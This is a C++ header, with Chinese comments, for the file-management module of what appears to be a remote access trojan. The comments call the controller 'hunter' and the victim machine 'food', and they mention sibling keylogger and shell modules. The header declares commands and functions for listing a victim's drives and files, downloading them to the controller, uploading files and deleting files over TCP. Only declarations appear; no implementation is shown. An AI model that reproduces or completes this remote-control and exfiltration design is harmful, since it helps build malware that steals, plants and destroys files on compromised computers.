// 文件相关操作模块
// 采用单例模式

#pragma once
#include "TcpSocket.h"
#include <map>
#include <vector>
#include <cstdlib>

class File
{
public:
	File();

	// -------------------------定义文件操作相关指令---------------------------------
	// hunter发给食物
	std::string CmdGetDirFiles;       // 获取路径下的所有文件名和路径名
	std::string CmdDownloadFile;      // hunter从食物下载文件
	std::string CmdUploadFile;        // hunter上传文件到食物
	std::string CmdDeleteFile;        // hunter在食物里删除文件
	// 食物发给hunter
	std::string CmdSendDrives;        // 发送盘符
	std::string CmdSendDirs;          // 发送路径下所有路径名
	std::string CmdSendFiles;         // 发送路径下所有文件名
	std::string CmdDeleteFileSuccess; // 成功删除文件
	std::string CmdDeleteFileFailed;  // 删除文件失败
	// 分割与结束符
	std::string CmdSplit;
	std::string CmdEnd;
	std::string CmdFileSplit;
	// -------------------------定义文件操作相关指令(完)---------------------------------

	// 此类入口函数 跟Keybd和shell模块形式差不多
	static void startByNewThread(std::string domain, int port);
	static DWORD WINAPI fileThreadProc(LPVOID args);
	static void startFile(std::string domain, int port);
	// 命令解析和执行
	static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);
	static std::map<std::string, std::string> parseArgs(std::string& data);
	static void processCmd(TcpSocket* sock, std::string& cmd, std::string& data);
	// 命令处理的几个函数
	static void doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doDownloadFile(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doDeleteFile(TcpSocket* sock, std::map<std::string, std::string>& args);

	// 获取所有盘符
	static std::vector<std::string> getDrives();
	// 获取路径下所有路径
	static std::vector<std::string> getDirs(std::string dir);
	// 获取路径下所有文件
	static std::vector<std::string> getFiles(std::string dir);

	// 发送文件的自定义数据包头
	typedef struct {
		char fileName[256];
		unsigned int len;
	} FileHeader;

	// 发送文件入口函数（当然要再开一个线程了）
	static void startSendFileByNewThread(std::string filePath, std::string domain, int port);
	static DWORD WINAPI sendFileThreadProc(LPVOID args);
	static void startSendFile(std::string filePath, std::string domain, int port);
	// 接收文件入口函数（当然要再开一个线程了）
	static void startRecvFileByNewThread(std::string filePath, std::string domain, int port);
	static DWORD WINAPI recvFileThreadProc(LPVOID args);
	static void startRecvFile(std::string filePath, std::string domain, int port);
};

